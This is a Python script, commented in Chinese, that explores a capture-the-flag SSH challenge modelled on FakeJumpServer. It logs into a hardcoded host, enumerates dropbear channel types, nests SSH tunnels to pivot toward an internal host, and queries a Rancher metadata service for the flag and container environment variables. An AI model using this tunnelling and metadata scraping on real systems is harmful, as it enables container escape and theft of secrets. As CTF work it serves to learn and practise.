#!/usr/bin/env python3
"""
重新思考FakeJumpServer攻击
核心问题：如何利用SSH特性逃出容器？

用户提示回顾：
1. "SSH特性利用而非漏洞利用"
2. "类似Aliyun CTF 2025 FakeJumpServer"
3. "第二次SSH连接的错误是有用的提示"
4. "用户名/密码注入无关"
"""

import paramiko
import socket
import time
import struct

HOST = "61.147.171.105"
PORT = 55300

def research_fakejumpserver():
    """
    FakeJumpServer攻击原理：
    
    正常的SSH ProxyJump工作流程：
    1. 用户SSH到跳板机A
    2. 用户在A上执行 ssh -J A B 或使用 ProxyJump=A 连接B
    3. 实际上是通过A的SSH通道建立到B的连接
    
    FakeJumpServer攻击：
    1. 攻击者控制的"跳板机"模拟正常SSH服务
    2. 但它会解析特定格式的用户名（如user@target）
    3. 自动将连接转发到target
    4. 可能捕获/重放凭据
    
    在CTF场景中，可能的利用方式：
    - 让FakeJumpServer转发我们的连接到真实目标
    - 利用FakeJumpServer的某些行为获取flag
    """
    print("=" * 70)
    print("[*] FakeJumpServer攻击原理分析")
    print("=" * 70)
    
    print("""
    关键观察：
    1. dropbear解析包含@的用户名，并尝试转发
    2. 转发后连接关闭，说明认证失败或连接被拒绝
    3. 但direct-tcpip工作正常
    
    "第二次SSH连接的错误"可能指：
    - dropbear转发时的内部错误
    - 或者目标服务器返回的错误
    
    新假设：
    -------
    如果dropbear在转发时，会先建立到目标的SSH连接，
    然后使用我们提供的密码进行认证...
    
    那么即使认证失败，dropbear可能已经：
    1. 与目标建立了TCP连接
    2. 完成了SSH握手
    3. 尝试了认证
    
    认证失败的错误信息可能包含有用信息！
    """)

def test_verbose_error():
    """
    尝试获取更详细的错误信息
    """
    print("\n" + "=" * 70)
    print("[*] 获取详细错误信息")
    print("=" * 70)
    
    # 使用原始socket，仔细分析每个步骤
    test_usernames = [
        "ctf@172.17.0.1",  # 真实Ubuntu
        "ctf@localhost",   # fake到dropbear
    ]
    
    for username in test_usernames:
        print(f"\n--- 测试: {username} ---")
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # 启用详细日志
            paramiko.util.log_to_file("paramiko_debug.log", level="DEBUG")
            
            client.connect(HOST, PORT, username=username, password="123456", 
                          timeout=10, banner_timeout=10, auth_timeout=10)
            
            print("  连接成功!")
            client.close()
        except paramiko.SSHException as e:
            print(f"  SSH错误: {e}")
        except Exception as e:
            print(f"  错误: {e}")

def explore_another_approach():
    """
    另一种思路：利用SSH的其他特性
    
    SSH有很多可以被利用的特性：
    1. Agent Forwarding - 转发SSH密钥代理
    2. X11 Forwarding - 转发X11显示
    3. Port Forwarding - 端口转发（我们已经测试了）
    4. ProxyJump/ProxyCommand - 跳板连接
    5. Escape sequences - SSH转义序列
    
    让我们检查dropbear支持哪些特性
    """
    print("\n" + "=" * 70)
    print("[*] 检查dropbear支持的SSH特性")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    print(f"\n服务器版本: {transport.remote_version}")
    print(f"本地版本: {transport.local_version}")
    
    # 检查支持的扩展
    print("\n[1] 检查全局请求响应...")
    
    global_requests = [
        ("tcpip-forward", "127.0.0.1", 0),
        ("no-more-sessions@openssh.com",),
        ("hostkeys-00@openssh.com",),
    ]
    
    # 测试端口转发
    print("\n[2] 测试端口转发...")
    try:
        port = transport.request_port_forward("127.0.0.1", 0)
        print(f"  远程端口转发成功: {port}")
        transport.cancel_port_forward("127.0.0.1", port)
    except Exception as e:
        print(f"  远程端口转发失败: {e}")
    
    # 测试打开不同类型的通道
    print("\n[3] 测试通道类型...")
    channel_types = [
        "session",
        "direct-tcpip",
        "x11",
        "forwarded-tcpip",
        "auth-agent@openssh.com",
    ]
    
    for ct in channel_types:
        try:
            if ct == "direct-tcpip":
                chan = transport.open_channel(ct, ("127.0.0.1", 22), ("127.0.0.1", 0))
            elif ct == "session":
                chan = transport.open_channel(ct)
            elif ct == "forwarded-tcpip":
                continue  # 需要先设置转发
            else:
                chan = transport.open_channel(ct)
            
            print(f"  {ct}: 支持")
            chan.close()
        except paramiko.ChannelException as e:
            print(f"  {ct}: 不支持 ({e})")
        except Exception as e:
            print(f"  {ct}: 错误 ({e})")
    
    client.close()

def test_escape_through_nested():
    """
    测试：通过嵌套SSH逃逸
    
    思路：
    1. 第一层：连接到dropbear
    2. 第二层：通过direct-tcpip连接到localhost（fake到dropbear）
    3. 第三层：在第二层中再次direct-tcpip到172.17.0.1
    
    看看多层嵌套是否能绕过某些限制
    """
    print("\n" + "=" * 70)
    print("[*] 多层嵌套SSH测试")
    print("=" * 70)
    
    # 第一层
    client1 = paramiko.SSHClient()
    client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client1.connect(HOST, PORT, "ctf", "123456")
    transport1 = client1.get_transport()
    print("第一层连接成功")
    
    # 第一层执行命令（验证受限）
    print("\n[1] 第一层执行命令...")
    stdin, stdout, stderr = client1.exec_command("id 2>&1")
    output1 = stdout.read().decode()
    print(f"  输出: {output1[:100] if output1 else '(empty)'}")
    
    # 第二层 - 通过direct-tcpip到localhost
    print("\n[2] 建立第二层（到localhost）...")
    chan1 = transport1.open_channel("direct-tcpip", ("localhost", 22), ("127.0.0.1", 0))
    transport2 = paramiko.Transport(chan1)
    transport2.start_client()
    transport2.auth_password("ctf", "123456")
    print("  第二层认证成功")
    
    # 在第二层执行命令
    print("\n[3] 第二层执行命令...")
    session2 = transport2.open_channel("session")
    session2.exec_command("id 2>&1")
    time.sleep(1)
    try:
        output2 = session2.recv(4096).decode()
        print(f"  输出: {output2[:100] if output2 else '(empty)'}")
    except:
        print("  无输出")
    session2.close()
    
    # 尝试在第二层做端口转发
    print("\n[4] 第二层端口转发...")
    try:
        chan2 = transport2.open_channel("direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0))
        print("  direct-tcpip成功")
        banner = chan2.recv(1024).decode()
        print(f"  Banner: {banner[:50]}")
        chan2.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    transport2.close()
    client1.close()

def search_for_flag_locations():
    """
    搜索可能的flag位置
    """
    print("\n" + "=" * 70)
    print("[*] 搜索flag位置")
    print("=" * 70)
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, "ctf", "123456")
    transport = client.get_transport()
    
    # 在Rancher metadata中搜索flag相关信息
    print("\n[1] 搜索Rancher metadata中的flag信息...")
    
    endpoints = [
        "/latest/",
        "/latest/self/",
        "/latest/self/service/",
        "/latest/self/container/",
        "/latest/self/container/create_index",
        "/latest/self/container/name",
        "/latest/services/",
        "/latest/containers/",
    ]
    
    for endpoint in endpoints:
        try:
            chan = transport.open_channel("direct-tcpip", ("172.17.0.2", 80), ("127.0.0.1", 0))
            chan.settimeout(3)
            request = f"GET {endpoint} HTTP/1.0\r\nHost: rancher-metadata\r\nAccept: text/plain\r\n\r\n"
            chan.send(request.encode())
            response = chan.recv(8192).decode()
            
            if "flag" in response.lower():
                print(f"\n[!!!] {endpoint} 包含flag:")
                print(response[:500])
            
            chan.close()
        except:
            pass
    
    # 检查容器环境变量中的flag
    print("\n[2] 检查环境变量...")
    try:
        chan = transport.open_channel("direct-tcpip", ("172.17.0.2", 80), ("127.0.0.1", 0))
        chan.settimeout(3)
        request = "GET /latest/self/container/environment HTTP/1.0\r\nHost: rancher-metadata\r\n\r\n"
        chan.send(request.encode())
        response = chan.recv(8192).decode()
        
        print(f"  环境变量:")
        if "\r\n\r\n" in response:
            body = response.split("\r\n\r\n", 1)[1]
            print(f"  {body[:500]}")
        chan.close()
    except Exception as e:
        print(f"  错误: {e}")
    
    client.close()

if __name__ == "__main__":
    research_fakejumpserver()
    # test_verbose_error()
    explore_another_approach()
    test_escape_through_nested()
    search_for_flag_locations()
